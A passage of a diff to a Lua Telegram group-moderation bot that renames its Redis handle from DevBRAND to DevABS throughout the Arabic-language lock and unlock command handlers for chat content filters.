+if DevABS:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح تعديل الميديا")  
-DevBRAND:del(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تعديل الميديا بالفعل مفتوح في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الفارسيه" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Farsi'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Farsi'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الفارسيه")  
-DevBRAND:del(BRAND..'BRAND:Lock:Farsi'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Farsi'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الفشار" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الفشار")  
-DevBRAND:set(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Fshar'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الفشار بالفعل مفتوح في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الطائفيه" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Taf'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Taf'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الطائفيه")  
-DevBRAND:set(BRAND..'BRAND:Lock:Taf'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Taf'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الطائفيه بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الكفر" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الكفر")  
-DevBRAND:set(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Kfr'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الكفر بالفعل مفتوح في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الفارسيه بالطرد" then
-if DevBRAND:get(BRAND..'BRAND:Lock:FarsiBan'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:FarsiBan'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الفارسيه بالطرد")  
-DevBRAND:del(BRAND..'BRAND:Lock:FarsiBan'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:FarsiBan'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالطرد بالفعل مفتوحه', 1, 'md')
 end
 end
 if UnLockText[2] == "البوتات" or UnLockText[2] == "البوتات بالطرد" or UnLockText[2] == "البوتات بالتقييد" or UnLockText[2] == "البوتات بالتقيد" then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح البوتات")  
-DevBRAND:del(BRAND.."BRAND:Lock:Bots"..msg.chat_id_)  
+DevABS:del(BRAND.."BRAND:Lock:Bots"..msg.chat_id_)  
 end
 if UnLockText[2] == "التكرار" then 
-DevBRAND:hdel(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
+DevABS:hdel(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التكرار")  
 end
 if BasicConstructor(msg) then
 if UnLockText[2] == "التثبيت" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Pin'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Pin'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح التثبيت")  
-DevBRAND:del(BRAND..'BRAND:Lock:Pin'..msg.chat_id_)
-DevBRAND:srem(BRAND.."BRAND:Lock:Pinpin",msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Pin'..msg.chat_id_)
+DevABS:srem(BRAND.."BRAND:Lock:Pinpin",msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙التثبيت بالفعل مفتوح في المجموعه', 1, 'md')
 end end end
@@ -7729,177 +7729,177 @@ if Admin(msg) then
 if text and text:match("^قفل (.*)$") then
 local LockText = {string.match(text, "^(قفل) (.*)$")}
 if LockText[2] == "الدردشه" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Text'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Text'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الدردشه")  
-DevBRAND:set(BRAND..'BRAND:Lock:Text'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Text'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الدردشه بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الاونلاين" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Inline'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Inline'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الاونلاين")  
-DevBRAND:set(BRAND..'BRAND:Lock:Inline'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Inline'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الاونلاين بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الصور" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Photo'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Photo'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الصور")  
-DevBRAND:set(BRAND..'BRAND:Lock:Photo'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Photo'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الصور بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الكلايش" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Spam'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Spam'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الكلايش")  
-DevBRAND:set(BRAND..'BRAND:Lock:Spam'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Spam'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الكلايش بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الدخول" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Join'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Join'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الدخول")  
-DevBRAND:set(BRAND..'BRAND:Lock:Join'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Join'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الدخول بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الفيديو" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Videos'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Videos'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الفيديو")  
-DevBRAND:set(BRAND..'BRAND:Lock:Videos'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Videos'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الفيديو بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "المتحركه" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Gifs'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Gifs'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل المتحركه")  
-DevBRAND:set(BRAND..'BRAND:Lock:Gifs'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Gifs'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙المتحركه بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الاغاني" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Music'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Music'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الاغاني")  
-DevBRAND:set(BRAND..'BRAND:Lock:Music'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Music'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الاغاني بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الصوت" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Voice'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Voice'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الصوت")  
-DevBRAND:set(BRAND..'BRAND:Lock:Voice'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Voice'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الصوت بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الروابط" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الروابط")  
-DevBRAND:set(BRAND..'BRAND:Lock:Links'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Links'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الروابط بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "المواقع" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Location'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Location'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل المواقع")  
-DevBRAND:set(BRAND..'BRAND:Lock:Location'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Location'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙المواقع بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "المعرف" or LockText[2] == "المعرفات" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل المعرفات")  
-DevBRAND:set(BRAND..'BRAND:Lock:Tags'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Tags'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙المعرفات بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الملفات" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Document'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Document'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الملفات")  
-DevBRAND:set(BRAND..'BRAND:Lock:Document'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Document'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الملفات بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الهاشتاك" or LockText[2] == "التاك" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الهاشتاك")  
-DevBRAND:set(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الهاشتاك بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الجهات" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Contact'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Contact'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الجهات")  
-DevBRAND:set(BRAND..'BRAND:Lock:Contact'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Contact'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '️⌁︙الجهات بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الشبكات" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الشبكات")  
-DevBRAND:set(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_,true) 
+DevABS:set(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_,true) 
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الشبكات بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "العربيه" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل العربيه")  
-DevBRAND:set(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العربيه بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الانكليزيه" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الانكليزيه")  
-DevBRAND:set(BRAND..'BRAND:Lock:English'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:English'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الانكليزيه بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الملصقات" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Stickers'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Stickers'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الملصقات")  
-DevBRAND:set(BRAND..'BRAND:Lock:Stickers'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Stickers'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الملصقات بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الماركداون" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Markdown'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Markdown'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الماركداون")  
-DevBRAND:set(BRAND..'BRAND:Lock:Markdown'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Markdown'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الماركداون بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الاشعارات" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الاشعارات")  
-DevBRAND:set(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الاشعارات بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "التوجيه" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
+if not DevABS:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التوجيه")  
-DevBRAND:set(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_,true)
+DevABS:set(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_,true)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙التوجيه بالفعل مقفل في المجموعه', 1, 'md')
 end
@@ -7911,177 +7911,177 @@ if Admin(msg) then
 if text and text:match("^فتح (.*)$") then
 local UnLockText = {string.match(text, "^(فتح) (.*)$")}
 if UnLockText[2] == "الدردشه" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Text'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Text'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الدردشه")  
-DevBRAND:del(BRAND..'BRAND:Lock:Text'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Text'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الدردشه بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الصور" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Photo'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Photo'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الصور")  
-DevBRAND:del(BRAND..'BRAND:Lock:Photo'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Photo'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الكلايش" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Spam'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Spam'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الكلايش")  
-DevBRAND:del(BRAND..'BRAND:Lock:Spam'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Spam'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الكلايش بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الدخول" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Join'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Join'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الدخول")  
-DevBRAND:del(BRAND..'BRAND:Lock:Join'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Join'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الدخول بالفعل مفتوح في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الفيديو" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Videos'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Videos'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الفيديو")  
-DevBRAND:del(BRAND..'BRAND:Lock:Videos'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Videos'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الفيديو بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الملفات" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Document'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Document'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الملفات")  
-DevBRAND:del(BRAND..'BRAND:Lock:Document'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Document'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الملفات بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الاونلاين" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Inline'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Inline'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الاونلاين")  
-DevBRAND:del(BRAND..'BRAND:Lock:Inline'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Inline'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الاونلاين بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الماركداون" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Markdown'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Markdown'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الماركداون")  
-DevBRAND:del(BRAND..'BRAND:Lock:Markdown'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Markdown'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الماركداون بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "المتحركه" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Gifs'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Gifs'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح المتحركه")  
-DevBRAND:del(BRAND..'BRAND:Lock:Gifs'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Gifs'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙المتحركه بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الاغاني" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Music'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Music'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الاغاني")  
-DevBRAND:del(BRAND..'BRAND:Lock:Music'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Music'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الاغاني بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الصوت" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Voice'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Voice'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الصوت")  
-DevBRAND:del(BRAND..'BRAND:Lock:Voice'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Voice'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الصوت بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الروابط" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الروابط")  
-DevBRAND:del(BRAND..'BRAND:Lock:Links'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Links'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الروابط بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "المواقع" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Location'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Location'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح المواقع")  
-DevBRAND:del(BRAND..'BRAND:Lock:Location'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Location'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙المواقع بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "المعرف" or UnLockText[2] == "المعرفات" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح المعرفات")  
-DevBRAND:del(BRAND..'BRAND:Lock:Tags'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Tags'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙المعرفات بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الهاشتاك" or UnLockText[2] == "التاك" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الهاشتاك")  
-DevBRAND:del(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الهاشتاك بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الجهات" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Contact'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Contact'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الجهات")  
-DevBRAND:del(BRAND..'BRAND:Lock:Contact'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Contact'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الجهات بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الشبكات" then
-if DevBRAND:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح الشبكات")  
-DevBRAND:del(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙الشبكات بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "العربيه" then
-if DevBRAND:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم فتح العربيه")  
-DevBRAND:del(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙العربيه بالفعل مفتوحه في المجموعه', 1, 'md')
 end
 end
 if UnLockText[2] == "الانكليزيه" then
